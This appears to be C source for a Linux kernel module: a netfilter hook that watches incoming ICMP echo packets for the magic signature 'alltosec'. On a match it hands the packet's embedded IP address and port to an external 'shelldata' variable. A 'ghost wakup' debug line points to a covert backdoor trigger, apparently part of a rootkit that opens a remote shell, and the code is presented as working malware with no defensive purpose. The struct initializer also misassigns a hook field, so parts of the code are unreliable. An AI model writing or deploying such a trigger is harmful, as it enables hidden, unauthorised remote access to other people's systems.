#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/version.h>

/* ****
int nf_register_hook(struct nf_hook_ops *reg);
struct nf_hook_ops
{
	struct list_head list;


	nf_hookfn *hook;
	struct module *owner;
	int pf;
	int hooknum;

	int priority;
};
typedef unsigned int nf_hookfn(unsigned int hooknum,
			       struct sk_buff **skb,
			       const struct net_device *in,
			       const struct net_device *out,
			       int (*okfn)(struct sk_buff *));

******/
#pragma pack(push)
#pragma pack(1)
typedef struct _param_data
{
	unsigned char sign[8];
	unsigned int nip;
	unsigned short hport;
} param_data;
typedef struct _icmp_data
{
	struct icmphdr hdr;
	param_data data;
} icmp_data;
#pragma pack(pop)

#ifdef CONFIG_X86_64
typedef unsigned long  u64_t;
#elif CONFIG_X86
typedef unsigned long long u64_t;
#endif

static const unsigned char *passsign = "alltosec";
static struct nf_hook_ops nfhookops = {
	//.hook = nf_icmp_hook,
	.pf = PF_INET,
	.hook = NF_IP_PRE_ROUTING,
	.priority = NF_IP_PRI_FIRST
};
extern void* shelldata;

unsigned int nf_icmp_hook(unsigned int hooknum, struct sk_buff **skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,22)
	struct iphdr *iph = ip_hdr(skb);
	icmp_data *icmp = icmp_hdr(skb);
#else
	struct iphdr *iph = (*skb)->nh.iph;
	icmp_data *icmp = (void *)iph + iph->ihl * 4;
#endif
	if(iph->protocol == IPPROTO_ICMP)
	{
		if(icmp->hdr.type != ICMP_ECHO)
			return NF_ACCEPT;
		if(*(u64_t *) &icmp->data.sign != *(u64_t *) passsign)
			return NF_ACCEPT;
		//printk(KERN_INFO "ghost wakup, heihei\r\n");
		shelldata = (void*) &icmp->data;
	}

	return NF_ACCEPT;
}

void do_nf_icmp_hook(void)
{
	nfhookops.hook = nf_icmp_hook;
	nf_register_hook(&nfhookops);
}
void do_nf_icmp_unhook(void)
{
	nf_unregister_hook(&nfhookops);
}
